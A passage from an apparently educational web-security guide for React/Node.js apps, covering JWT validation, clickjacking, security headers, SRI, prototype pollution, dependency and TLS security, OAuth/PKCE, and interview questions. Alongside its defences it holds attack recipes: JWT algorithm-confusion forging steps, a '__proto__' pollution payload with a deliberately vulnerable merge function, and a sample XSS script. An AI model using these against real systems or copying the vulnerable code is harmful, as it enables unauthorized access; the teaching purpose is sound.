  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing token' });
  }

  const token = authHeader.slice(7);

  try {
    const payload = jwt.verify(token, process.env.JWT_SECRET, {
      issuer: 'myapp',          // validates iss claim
      audience: 'myapp-api',    // validates aud claim
      algorithms: ['HS256'],    // IMPORTANT: explicitly specify allowed algorithms
      // Without this, algorithm confusion attacks are possible
    });

    // Verify the user still exists (optional but recommended)
    const user = await db.users.findById(payload.sub);
    if (!user || user.suspended) {
      return res.status(401).json({ error: 'User not found or suspended' });
    }

    req.user = user;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
}
```

---

### Algorithm Confusion Attacks

```text
alg: none attack:
  JWT header has "alg": "none" — means no signature.
  Attacker modifies the payload (changes role to admin) and removes the signature.
  If the server accepts alg: none, it will accept any payload without verification.
  Defense: explicitly specify allowed algorithms — never accept 'none'.

RS256 → HS256 confusion attack:
  App uses RS256 (asymmetric): signed with private key, verified with public key.
  The public key is public — anyone can read it.
  If server also accepts HS256 (symmetric), attacker can:
    1. Get the server's RSA public key (often available at /.well-known/jwks.json)
    2. Forge a token with alg: HS256, sign it with the PUBLIC key as the HS256 secret
    3. Server tries to verify: sees HS256, uses its "HS256 key" (which is the public key) → matches!
  Defense: algorithms: ['RS256'] — only accept one algorithm type, never both.
```

```js
// VULNERABLE: not specifying algorithms
const payload = jwt.verify(token, secret); // accepts whatever alg the token claims

// SAFE: always lock down to specific algorithms
const payload = jwt.verify(token, secret, {
  algorithms: ['HS256'], // or ['RS256'] — never leave this unspecified
});

// Detecting alg: none manually (if using a custom verify):
const [headerB64] = token.split('.');
const header = JSON.parse(Buffer.from(headerB64, 'base64').toString());
if (header.alg === 'none') {
  throw new Error('Algorithm "none" not allowed');
}
```

---

## 6. Clickjacking

### How the attack works

```text
Clickjacking: attacker embeds your site in a transparent iframe on their malicious page.
They overlay their UI on top to trick users into clicking things on YOUR site.

Example:
  - Your site: bank.com has a "Transfer $1000" button
  - Attacker site: evil.com has "Win a free iPhone! Click here!"
  - evil.com embeds bank.com in an invisible iframe positioned so the
    "Transfer" button is exactly under the "Win a prize" button
  - User clicks "Win a prize" → actually clicks "Transfer $1000" on bank.com
  - The click is authenticated because the user is logged in to bank.com

Requirements for the attack to work:
  1. Victim must be authenticated to the target site
  2. The target site must be embeddable in an iframe (no clickjacking protection)
  3. The attacker must know the layout of the target site well enough to align buttons
```

```js
// Defense 1: X-Frame-Options header (older, widely supported)
res.setHeader('X-Frame-Options', 'DENY');        // no one can iframe this page
res.setHeader('X-Frame-Options', 'SAMEORIGIN');  // only same origin can iframe it
// X-Frame-Options cannot specify a specific external domain (use CSP for that)

// Defense 2: CSP frame-ancestors (modern, supersedes X-Frame-Options)
res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
// Equivalent to DENY — no one can iframe this page

res.setHeader('Content-Security-Policy', "frame-ancestors 'self'");
// Only same origin can iframe it

res.setHeader('Content-Security-Policy', "frame-ancestors 'self' https://trusted-partner.com");
// Allows specific external sites — impossible with X-Frame-Options

// Use BOTH for maximum compatibility (X-Frame-Options for older browsers,
// CSP frame-ancestors takes precedence in browsers that support it)
app.use(helmet.frameguard({ action: 'deny' })); // sets X-Frame-Options: DENY
// helmet.contentSecurityPolicy() sets frame-ancestors separately

// Defense 3: JavaScript frame-busting (legacy, NOT reliable — CSP breaks it)
// Only use if you can't set headers (e.g., shared hosting)
if (window.top !== window.self) {
  window.top.location = window.self.location; // break out of iframe
}
// Attackers can defeat this with: <iframe sandbox="allow-scripts"> (blocks navigation)
// Stick to headers.
```

---

## 7. Security Headers — Full Production Checklist

### Overview

```text
Security headers are HTTP response headers that tell the browser to enforce
additional security policies. They're your last line of defense and your
first line of security hygiene. Setting them is low effort, high value.

In Express, use the 'helmet' package — it sets most of these with good defaults.
  npm install helmet
  app.use(helmet()); // sets all of the below with sensible defaults
```

```js
const helmet = require('helmet');

// Use helmet with all defaults — good starting point
app.use(helmet());

// Or configure each header individually:
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-<generated>'"],
      // ... full CSP config
    }
  },
  hsts: {
    maxAge: 31536000,        // 1 year in seconds
    includeSubDomains: true,
    preload: true,
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  permissionsPolicy: {
    features: {
      camera: ["'none'"],
      microphone: ["'none'"],
      geolocation: ["'self'"],
    }
  },
}));
```

---

### Strict-Transport-Security (HSTS)

```text
Tells the browser: "Only ever connect to this site over HTTPS.
If you see an http:// URL for this domain, upgrade it to https:// automatically.
Never show an insecure warning — just redirect."

max-age=31536000: remember this policy for 1 year
includeSubDomains: apply to all subdomains too
preload: included in browser's built-in HSTS preload list (hardcoded into Chrome/Firefox)

IMPORTANT: Only set this when your site is FULLY on HTTPS.
If you have any http:// resources or your cert expires, users will be locked out.

Once set with preload, removal is very difficult — takes months to propagate.
```

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

---

### X-Content-Type-Options: nosniff

```text
Prevents MIME-type sniffing.

Without this: if you serve a file with Content-Type: text/plain but the content
looks like JavaScript, some browsers will execute it as JavaScript anyway.
This enables attacks where uploaded files (images, text files) with embedded JS
get executed in a user's browser.

With nosniff: browser respects exactly the Content-Type you set, never "sniffs"
the actual content to guess the type.
```

```
X-Content-Type-Options: nosniff
```

---

### Referrer-Policy

```text
Controls what's in the Referer header when user navigates from your site.
Without this, clicking a link from https://yourapp.com/dashboard?token=abc to
an external site sends: Referer: https://yourapp.com/dashboard?token=abc
(exposing URL parameters to third parties)

Recommended: strict-origin-when-cross-origin
  - Same-origin requests: send full URL as referrer
  - Cross-origin requests: send only the origin (https://yourapp.com), not the full path
  - Downgrades (HTTPS → HTTP): send nothing
```

```
Referrer-Policy: strict-origin-when-cross-origin
```

---

### Permissions-Policy (formerly Feature-Policy)

```text
Restricts which browser features (camera, microphone, geolocation, etc.)
your site and embedded iframes can use.

If your app doesn't use the camera, deny camera access — so even if an attacker
gets XSS, they can't activate the camera without user prompt failing.
Also prevents embedded third-party iframes from using powerful features.
```

```
Permissions-Policy: camera=(), microphone=(), geolocation=(self), payment=()
```

---

### Cross-Origin-Opener-Policy (COOP)

```text
Isolates your browsing context from other cross-origin windows.

Without COOP: if window.open('https://yourapp.com') is called from another site,
that site gets a window reference and can potentially interact with your page
(Spectre-style attacks, cross-window communications).

same-origin: only allow opener relationship with same-origin windows
same-origin-allow-popups: you can open popups and keep reference (needed for OAuth flows)

Required for SharedArrayBuffer and high-resolution timers (Spectre mitigations).
Often paired with COEP for full process isolation.
```

```
Cross-Origin-Opener-Policy: same-origin-allow-popups
```

---

### Cross-Origin-Embedder-Policy (COEP)

```text
Requires all cross-origin resources your page loads to explicitly opt in
via CORS or CORP (Cross-Origin-Resource-Policy) headers.

COOP: same-origin + COEP: require-corp = enables cross-origin isolation.
Cross-origin isolation is required for:
  - SharedArrayBuffer
  - Performance.now() with high precision
  - Atomics.wait()

Downside: ALL third-party resources (images, scripts from CDNs) must have
CORS headers or CORP: cross-origin. This breaks lazy third-party integrations.
Test thoroughly before enabling in production.
```

```
Cross-Origin-Embedder-Policy: require-corp
```

---

### Complete Headers at a Glance

```js
// All security headers in one Express middleware block
app.use((req, res, next) => {
  // Force HTTPS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  // Prevent MIME sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  // Clickjacking protection (belt)
  res.setHeader('X-Frame-Options', 'DENY');
  // Referrer info control
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  // Disable browser features app doesn't use
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(self)');
  // Cross-origin window isolation
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin-allow-popups');
  // Require cross-origin resources to opt in (pair with COOP for isolation)
  // res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp'); // enable if you need SharedArrayBuffer
  // CSP (suspenders)
  res.setHeader('Content-Security-Policy', "default-src 'self'; frame-ancestors 'none'");
  next();
});
```

---

## 8. Subresource Integrity (SRI)

### What it is and why it matters

```text
When you load a script from a CDN:
  <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>

You're trusting that CDN completely. If the CDN is compromised or the URL is hijacked,
you serve malicious code to all your users — a supply chain attack via CDN.

SRI: you compute a cryptographic hash of the resource's content and include it
in the integrity attribute. The browser:
  1. Fetches the resource
  2. Computes its hash
  3. Compares to the integrity attribute
  4. Refuses to execute/apply if they don't match

This means even if the CDN file is modified, your users are protected.
```

```html
<!-- SRI on script tag -->
<script
  src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
  integrity="sha256-t9QRC9JF/qqRKP1HMiKsF/kqnYclYOefj5WCRQFxqX0="
  crossorigin="anonymous"
></script>
<!-- crossorigin="anonymous" is REQUIRED for SRI on cross-origin resources -->

<!-- SRI on stylesheet -->
<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
  integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
  crossorigin="anonymous"
/>
```

```bash
# How to generate the integrity hash for any URL:
curl -s https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js \
  | openssl dgst -sha384 -binary \
  | openssl base64 -A
# Output: the base64 hash — prepend "sha384-" to get the integrity value

# Or use the srihash.org online tool / your bundler's SRI plugin

# Webpack SRI plugin: webpack-subresource-integrity
# Automatically adds integrity hashes to all script/link tags in HTML output
```

```js
// Vite / Rollup: SRI plugin
// npm install vite-plugin-subresource-integrity
// vite.config.ts:
import { defineConfig } from 'vite';
import sri from 'vite-plugin-subresource-integrity';

export default defineConfig({
  plugins: [sri()], // adds integrity attributes to all output assets
});
```

---

## 9. Prototype Pollution

### How it works in JavaScript

```text
JavaScript's prototype chain: every object inherits from Object.prototype.
If you can set Object.prototype.isAdmin = true, then EVERY object in the app
has isAdmin = true — including your auth check objects.

Attack surface: any function that does a "deep merge" of user-supplied JSON
without guarding against __proto__ or constructor.prototype keys.

If a server-side function does:
  merge(target, userInput)
  where userInput = { "__proto__": { "isAdmin": true } }
  → Object.prototype.isAdmin is now true
  → checks like (if user.isAdmin) pass for every user object

Why __proto__ works:
  obj.__proto__ === Object.getPrototypeOf(obj)
  Setting obj.__proto__.x = 1 sets it on ALL objects' prototype.
  Similarly: { "constructor": { "prototype": { "isAdmin": true } } }
```

```js
// VULNERABLE: naive deep merge
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, userInput);

// Now:
const obj = {};
console.log(obj.isAdmin); // true — POLLUTED!

// ATTACK SCENARIO in Express:
app.post('/update-settings', (req, res) => {
  merge(userSettings, req.body); // req.body contains __proto__ pollution
  // Now ALL objects have attacker-defined properties
  // if (req.user.isAdmin) → true for everyone
});

// DEFENSE 1: check for dangerous keys in merge
function safeMerge(target, source) {
  for (const key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue; // skip dangerous keys
    }
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = safeMerge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// DEFENSE 2: use Object.create(null) for maps — no prototype to pollute
const safeMap = Object.create(null);
safeMap.__proto__ = 'harmless'; // just sets a string property, no prototype pollution

// DEFENSE 3: use structuredClone() or JSON parse/stringify for copying
const cloned = JSON.parse(JSON.stringify(userInput)); // strips prototype
// structuredClone() also strips prototype

// DEFENSE 4: use well-maintained libraries for deep merge
// lodash >=4.17.21, merge-deep — fixed prototype pollution
// Always keep dependencies up to date

// DEFENSE 5: freeze Object.prototype (drastic — may break some libraries)
Object.freeze(Object.prototype);

// DEFENSE 6: use Map instead of plain objects for user-controlled data
const settings = new Map();
settings.set(userKey, userValue); // Map has no prototype pollution risk

// DETECTION: test your merge utilities
const test = {};
console.log(test.polluted); // should be undefined after merge — if defined, you have pollution
```

---

## 10. Dependency Security

### npm audit and vulnerability management

```text
Your app's attack surface includes every npm package you install.
A vulnerability in a transitive dependency (a dependency of a dependency)
can compromise your entire app.

Supply chain attacks: attacker compromises a popular package (or its maintainer)
to inject malicious code. Real examples:
  - event-stream (2018): malicious code targeting bitcoin wallets
  - ua-parser-js (2021): crypto miner and password stealer injected
  - left-pad (2016): deletion caused mass breakage (availability, not security)
  - colors/faker (2022): maintainer intentionally broke their own packages
  - node-ipc (2022): anti-war protest code, destructive on Russian IPs
```

```bash
# Audit your dependencies for known vulnerabilities
npm audit
# Shows vulnerabilities, severity, and affected packages

# Auto-fix low-risk vulnerabilities
npm audit fix

# Fix including breaking changes (use carefully — may break your app)
npm audit fix --force

# Audit in CI: fail the build if HIGH or CRITICAL vulnerabilities exist
npm audit --audit-level=high
# Returns non-zero exit code if vulnerabilities at that level or above are found

# Check a specific package's vulnerability history
npm audit --json | jq '.vulnerabilities'

# List all installed packages and their versions (useful for diff after upgrade)
npm list --depth=0
```

```json
// package.json: use exact versions for critical security packages
// (pin versions, don't rely on semver ranges for things like jwt libraries)
{
  "dependencies": {
    "jsonwebtoken": "9.0.2",     // pinned — not "^9.0.2"
    "express": "^4.18.2"        // caret ok for well-maintained frameworks
  }
}
```

```bash
# package-lock.json: ALWAYS commit this file
# It locks the exact version of every transitive dependency.
# Without it: npm install may pick up a newer (potentially vulnerable) version
# of a transitive dep even if YOUR version spec hasn't changed.

# Check if lockfile is consistent with package.json
npm ci  # (clean install) uses lockfile exactly, fails if lockfile is outdated
        # Use npm ci in CI/CD, not npm install

# Never delete package-lock.json — it's a security artifact, not a generated annoyance
```

### Dependabot and automated updates

```yaml
# .github/dependabot.yml — GitHub Dependabot configuration
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"   # check for updates weekly
    open-pull-requests-limit: 10
    # Auto-merge patch updates (low risk)
    # Review minor/major updates manually
    labels:
      - "dependencies"
    ignore:
      - dependency-name: "some-internal-package"  # skip specific packages
```

```bash
# Snyk: alternative/complement to npm audit with more context
npm install -g snyk
snyk auth        # authenticate with Snyk account
snyk test        # scan for vulnerabilities
snyk monitor     # continuously monitor (sends to Snyk dashboard)

# Check packages BEFORE installing (avoid installing malicious packages)
# socket.dev — browser extension that warns about suspicious packages on npm registry page

# Verify a package's legitimacy before adding:
# 1. Check GitHub: is it actively maintained? Recent commits?
# 2. Check npm download stats: is it widely used?
# 3. Check for typosquatting: "expres" vs "express", "lodash" vs "1odash"
# 4. Check if the package's homepage/repo links are legitimate
# 5. Run in a sandbox first if uncertain

# Audit scripts in package.json — malicious packages often use postinstall
# to run code when you install them:
npm install --ignore-scripts  # skip lifecycle scripts (postinstall, etc.)
```

### Lockfile security

```text
Lockfile poisoning: attacker submits a PR that modifies package-lock.json
to point a dependency to a malicious version, without changing package.json.
  - The package.json still shows a safe version range
  - But npm ci uses the lockfile exactly → installs malicious version
  - Developers don't usually diff lockfile changes carefully

Defense:
  - Review lockfile changes in PRs — look for unexpected registry changes
  - Use npm audit in CI to catch known-bad versions
  - Consider using private npm registry (Verdaccio, npm Enterprise)
    with explicit package approval workflow
  - Use .npmrc with registry scoping to prevent packages from being
    pulled from unexpected registries
```

---

## 11. HTTPS and TLS

### Why HTTP-only is insecure

```text
HTTP is plaintext. Anyone on the network path between user and server can:
  - Read all request/response content (credentials, tokens, private data)
  - Modify responses in transit (inject ads, malware, fake content)
  - Steal session cookies — just read the Set-Cookie header
  - Perform replay attacks — capture and re-send authenticated requests

"I don't need HTTPS — I have no sensitive data" is wrong:
  - Cookies (including session cookies) are visible
  - JavaScript from your CDN can be modified to mine crypto in users' browsers
  - ISPs inject ads into HTTP pages
  - HTTPS is also faster with HTTP/2 (multiplexing, compression, push)

In 2024: there is NO excuse for serving anything over HTTP in production.
  - Free certificates: Let's Encrypt (auto-renew with certbot)
  - Hosting providers (Vercel, Netlify, Railway, Fly.io) give free HTTPS automatically
```

### Mixed Content

```text
Mixed content: HTTPS page loading HTTP sub-resources.

Active mixed content (scripts, iframes, XMLHttpRequest, fetch):
  → Browser BLOCKS these — they can modify the page and steal data.
  → Your HTTPS page trying to fetch from http://api.myapp.com will be blocked.

Passive mixed content (images, audio, video):
  → Browser LOADS these but shows a warning (padlock becomes grey/broken).
  → These CAN be intercepted and modified by a MitM.

Fix: upgrade ALL resource URLs to HTTPS.
CSP upgrade-insecure-requests tells the browser to upgrade http:// → https://
for all sub-resource requests automatically (helpful for legacy content).
```

```js
// Express: force HTTPS redirect in production
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production' && req.headers['x-forwarded-proto'] !== 'https') {
    // Note: req.protocol only works correctly with trust proxy set
    return res.redirect(301, `https://${req.hostname}${req.originalUrl}`);
  }
  next();
});

// Also set HSTS so browsers always upgrade future requests:
res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
```

---

### TLS Configuration

```text
TLS versions:
  TLS 1.0, 1.1: deprecated — known vulnerabilities (BEAST, POODLE). Disable.
  TLS 1.2: minimum acceptable version. Widely supported.
  TLS 1.3: current standard. Faster (1-RTT handshake vs 2-RTT). Enable.

Cipher suites: negotiate encryption algorithms. Disable weak ones:
  - RC4: broken
  - 3DES: deprecated
  - Export-grade ciphers: intentionally weakened (FREAK attack)
  Enable: AEAD ciphers (AES-GCM, ChaCha20-Poly1305)

In Node.js: TLS configuration is handled at the server level.
In production, terminate TLS at a load balancer/reverse proxy (nginx, AWS ALB)
and configure TLS there — simpler and more maintainable.

Test your TLS configuration:
  ssllabs.com/ssltest  — comprehensive TLS analysis
  testssl.sh           — command-line TLS tester
  securityheaders.com  — check all HTTP security headers
```

```nginx
# nginx TLS configuration (production-grade)
server {
    listen 443 ssl http2;
    server_name myapp.com;

    ssl_certificate     /etc/letsencrypt/live/myapp.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/myapp.com/privkey.pem;

    # TLS versions: only 1.2 and 1.3
    ssl_protocols TLSv1.2 TLSv1.3;

    # Strong cipher suites only
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off; # TLS 1.3 clients choose best cipher

    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # OCSP Stapling (faster cert validation for clients)
    ssl_stapling on;
    ssl_stapling_verify on;
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name myapp.com;
    return 301 https://$host$request_uri;
}
```

---

### Certificate Pinning

```text
Certificate pinning: hardcode the expected TLS certificate (or public key) in the client.
If the server's certificate doesn't match, refuse the connection.

Protects against:
  - Compromised CAs issuing fraudulent certificates for your domain
  - MitM with corporate proxies / anti-virus TLS interception

Used in:
  - Mobile apps (HTTPS certificate pinning in iOS/Android)
  - High-security web apps (HPKP — now deprecated in browsers)

HPKP (HTTP Public Key Pinning) was deprecated in Chrome 2018 because:
  - If you pin wrong or lose your keys, your site is inaccessible
  - Attackers could pin malicious keys via XSS (denial of service)

Browser alternative today: use Certificate Transparency + HSTS preload.
Mobile apps: still use certificate pinning via OkHttp (Android), TrustKit (iOS).
```

---

## 12. Auth Patterns — OAuth 2.0 and OpenID Connect

### OAuth 2.0 Core Concepts

```text
OAuth 2.0 is an AUTHORIZATION framework — it lets a user grant a third-party app
limited access to their resources on another service, without sharing their password.

Key roles:
  Resource Owner:    the user
  Client:            the app wanting access (your SPA, mobile app, backend)
  Authorization Server (AS): issues access tokens (Google, Auth0, Okta, Cognito)
  Resource Server:   the API being accessed (your API, Google Drive API, etc.)

The client never sees the user's password — the user authenticates directly with the AS.
The AS issues tokens that the client uses to call the Resource Server.

OAuth flows (grant types) — different flows for different client types:
  Authorization Code + PKCE: for SPAs, mobile apps — the CORRECT modern flow
  Client Credentials:         for machine-to-machine (no user involved)
  Device Code:                for TVs, CLIs — devices without browsers
  Implicit:                   DEPRECATED — do not use
```

---

### Authorization Code + PKCE Flow (for SPAs)

```text
PKCE (Proof Key for Code Exchange) — pronounced "pixie".
Designed for public clients (SPAs, mobile) that cannot keep a client secret.

Without PKCE (old Implicit flow problem):
  The AS returns the access token in the URL fragment (#access_token=...).
  Problem: URL fragments can be logged in browser history, Referer headers,
  server access logs (if the SPA is a hash-based router).
  Tokens are short-lived but still exposed.

Authorization Code Flow:
  Instead of returning a token, the AS returns a short-lived "code".
  The code is exchanged for a token in a back-channel request.
  For a traditional web app with a backend, the backend holds the client_secret
  and makes the exchange — safe.
  For a SPA with no backend, there's no secret — anyone could intercept the code.

PKCE fixes this:
  1. SPA generates a random "code verifier" (random string, 43-128 chars)
  2. SPA hashes it: code_challenge = BASE64URL(SHA256(code_verifier))
  3. SPA sends code_challenge (the hash, NOT the verifier) to AS with auth request
  4. AS stores the code_challenge associated with the issued code
  5. When SPA exchanges the code, it sends the original code_verifier
  6. AS verifies: SHA256(code_verifier) === stored code_challenge
  7. If an attacker intercepts the code, they don't have the code_verifier → exchange fails
```

```js
// React SPA: implementing OAuth Authorization Code + PKCE
// (typically use a library like oidc-client-ts or auth0-spa-js instead of rolling your own)

// Step 1: Generate PKCE values
async function generatePkce() {
  const codeVerifier = generateRandomString(128); // store securely in sessionStorage
  const encoder = new TextEncoder();
  const data = encoder.encode(codeVerifier);
  const digest = await window.crypto.subtle.digest('SHA-256', data);
  const codeChallenge = btoa(String.fromCharCode(...new Uint8Array(digest)))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, ''); // base64url encoding
  return { codeVerifier, codeChallenge };
}

function generateRandomString(length) {
  const possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~';
  const array = new Uint8Array(length);
  window.crypto.getRandomValues(array);
  return Array.from(array, byte => possible[byte % possible.length]).join('');
}

// Step 2: Redirect to Authorization Server
async function startOAuthFlow() {
  const { codeVerifier, codeChallenge } = await generatePkce();
  const state = generateRandomString(16); // CSRF protection for the OAuth flow itself

  // Store in sessionStorage — survives redirect, cleared on tab close
  sessionStorage.setItem('pkce_code_verifier', codeVerifier);
  sessionStorage.setItem('oauth_state', state);

  const params = new URLSearchParams({
    response_type: 'code',
    client_id: 'your-client-id',
    redirect_uri: 'https://yourapp.com/callback',
    scope: 'openid profile email',
    state,
    code_challenge: codeChallenge,
    code_challenge_method: 'S256',
  });

  window.location.href = `https://auth.provider.com/authorize?${params}`;
}

// Step 3: Handle callback — exchange code for tokens
async function handleOAuthCallback() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');
  const returnedState = params.get('state');
  const error = params.get('error');

  if (error) throw new Error(`OAuth error: ${error}`);

  // Verify state to prevent CSRF
  const expectedState = sessionStorage.getItem('oauth_state');
  if (returnedState !== expectedState) throw new Error('State mismatch — possible CSRF');

  const codeVerifier = sessionStorage.getItem('pkce_code_verifier');

  // Exchange code for tokens
  const tokenResponse = await fetch('https://auth.provider.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code,
      redirect_uri: 'https://yourapp.com/callback',
      client_id: 'your-client-id',
      code_verifier: codeVerifier, // the secret — proves we initiated this flow
    }),
  });

  const { access_token, refresh_token, id_token } = await tokenResponse.json();

  // Clean up PKCE values
  sessionStorage.removeItem('pkce_code_verifier');
  sessionStorage.removeItem('oauth_state');

  // Store tokens appropriately (memory for access token, httpOnly cookie via backend for refresh)
  storeTokensSecurely({ access_token, refresh_token, id_token });
}
```

---

### Why Implicit Flow is Deprecated

```text
Implicit flow (response_type=token):
  - Access token returned in URL fragment: /callback#access_token=xyz
  - Exposed in browser history, Referer headers, logs
  - No refresh tokens (short-lived tokens only)
  - Cannot use PKCE (it was designed for code flow)
  - No way to cryptographically verify the token came from the correct AS

OAuth 2.0 Security Best Current Practice (RFC 9700, 2025) explicitly forbids
Implicit flow for new implementations.

If you encounter an Authorization Server that still forces Implicit flow,
ask them to support Authorization Code + PKCE. If they won't, reconsider
using that provider.
```

---

### OpenID Connect (OIDC)

```text
OpenID Connect = OAuth 2.0 + identity layer.

OAuth 2.0 answers: "Can this app access this resource?"
OIDC answers: "Who is this user?"

OIDC adds:
  - id_token: a JWT containing user identity claims (sub, email, name, picture)
  - UserInfo endpoint: /userinfo — fetch additional user profile claims
  - Discovery document: /.well-known/openid-configuration — machine-readable config
  - Standard scopes: openid (required), profile, email, phone, address

When you "Sign in with Google", you're using OIDC.
Google is the OIDC Provider (OP). Your app is the Relying Party (RP).

id_token validation (NEVER skip this):
  1. Verify signature using AS's public keys (from /jwks.json)
  2. Verify iss matches the expected issuer
  3. Verify aud matches your client_id
  4. Verify exp is in the future
  5. Verify nonce matches (if you sent one — prevents replay attacks)
  6. Use sub as the stable user identifier (not email — emails change)
```

```js
// Verifying an OIDC id_token in Node.js
const jwksClient = require('jwks-rsa');
const jwt = require('jsonwebtoken');

const client = jwksClient({
  jwksUri: 'https://accounts.google.com/.well-known/jwks.json',
  cache: true,
  rateLimit: true,
  cacheMaxAge: 6 * 60 * 60 * 1000, // 6 hours
});

async function verifyIdToken(idToken, expectedNonce) {
  const decoded = jwt.decode(idToken, { complete: true });
  const kid = decoded.header.kid; // key ID — which key to use from JWKS

  const key = await client.getSigningKey(kid);
  const publicKey = key.getPublicKey();

  const payload = jwt.verify(idToken, publicKey, {
    algorithms: ['RS256'],
    issuer: 'https://accounts.google.com',
    audience: process.env.GOOGLE_CLIENT_ID,
  });

  // Verify nonce to prevent replay attacks
  if (payload.nonce !== expectedNonce) {
    throw new Error('Nonce mismatch');
  }

  return payload; // { sub, email, name, picture, email_verified, ... }
}
```

---

## 13. Secure Coding Checklist for React/Node.js Apps

### React Frontend

```text
Input / Output:
  [ ] Never use dangerouslySetInnerHTML with unsanitized content
  [ ] Sanitize HTML content with DOMPurify before dangerouslySetInnerHTML
  [ ] Validate URL schemes before using in href/src (block javascript:)
  [ ] Use textContent / innerText instead of innerHTML for user content
  [ ] Set rel="noopener noreferrer" on all target="_blank" links

State / Auth:
  [ ] Store access tokens in memory (React state/context), not localStorage
  [ ] Use httpOnly cookies for refresh tokens (handled by backend)
  [ ] Clear auth state on logout (revoke tokens + clear cookies via API)
  [ ] Implement refresh token rotation on the backend

Dependencies:
  [ ] Audit npm dependencies with npm audit before deployment
  [ ] Use SRI integrity attributes on CDN-loaded scripts and stylesheets
  [ ] Regularly update dependencies (Dependabot or Renovate)
  [ ] Minimize dependencies — each package is an attack surface

CSP:
  [ ] Implement Content-Security-Policy — even a basic one blocks most XSS
  [ ] Avoid 'unsafe-inline' — use nonces or hashes
  [ ] Set frame-ancestors 'none' to prevent clickjacking
  [ ] Set connect-src to restrict fetch() destinations

HTTPS:
  [ ] Serve ONLY over HTTPS in production (no mixed content)
  [ ] Use HTTPS even in staging environments
```

### Node.js / Express Backend

```text
Headers:
  [ ] Use helmet — all security headers with one line
  [ ] Explicitly configure CSP — don't rely on defaults
  [ ] Set HSTS with includeSubDomains
  [ ] Set X-Content-Type-Options: nosniff
  [ ] Set Referrer-Policy: strict-origin-when-cross-origin

Auth & Sessions:
  [ ] Hash passwords with bcrypt (saltRounds >= 12) — never MD5/SHA1
  [ ] Set httpOnly + Secure + SameSite on session/token cookies
  [ ] Implement rate limiting on auth endpoints (express-rate-limit)
  [ ] Validate JWT: signature, exp, iss, aud, algorithms
  [ ] Explicitly specify algorithms in jwt.verify()
  [ ] Rotate refresh tokens on each use; revoke old tokens

CORS:
  [ ] Whitelist specific origins — never wildcard * in production with credentials
  [ ] Validate origin against a list before reflecting it
  [ ] Set Vary: Origin header when using dynamic CORS
  [ ] Restrict CORS to only the routes that need it

Input Validation:
  [ ] Validate and sanitize all user input — use zod, joi, or express-validator
  [ ] Parameterize all database queries — no string concatenation for SQL
  [ ] Validate Content-Type on POST/PUT (reject unexpected types)
  [ ] Set body size limits: express.json({ limit: '10kb' })

Error Handling:
  [ ] Never expose stack traces or internal error messages to clients in production
  [ ] Log errors server-side with enough context; return generic messages to clients
  [ ] Catch all unhandled promise rejections (process.on('unhandledRejection', ...))

Dependencies:
  [ ] Run npm ci in CI/CD (uses lockfile exactly)
  [ ] Run npm audit --audit-level=high in CI pipeline (fail on high/critical)
  [ ] Pin critical security package versions
  [ ] Review lockfile changes in PRs
```

---

## 14. Common Interview Questions

---

**Q: What are the three types of XSS and how do you defend against each?**

```text
A:

Stored XSS: attacker submits malicious content (e.g. <script>evil()</script>)
that gets saved to the database and served to all users who view it.
Defense: HTML-encode all user content before rendering it in HTML.
In React, this happens automatically with JSX — the risk is only with dangerouslySetInnerHTML.

Reflected XSS: malicious script is embedded in a URL query param. Server reads the
param and reflects it into the HTML response without encoding.
Defense: output encoding on the server (he.encode(), template engine's auto-escape).

DOM-based XSS: no server involvement. Client-side JS reads from a source (location.hash,
postMessage, localStorage) and writes to a sink (innerHTML, eval) without sanitization.
Defense: prefer textContent over innerHTML. If you must use innerHTML, sanitize with DOMPurify.
Use Trusted Types API (enforced by CSP: require-trusted-types-for 'script') to prevent
